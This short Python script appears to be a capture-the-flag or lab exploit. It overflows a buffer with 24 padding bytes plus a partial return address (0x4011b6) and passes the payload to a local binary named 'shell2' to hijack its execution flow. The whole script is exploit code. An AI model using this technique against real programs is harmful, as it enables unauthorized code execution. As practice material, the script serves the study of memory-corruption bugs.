import subprocess
addr =0x4011b6
payload =b"A"*24+addr.to_bytes(8,"little")[:3]
print("payload 十六进制=",payload.hex())
subprocess.run(["./shell2",payload])
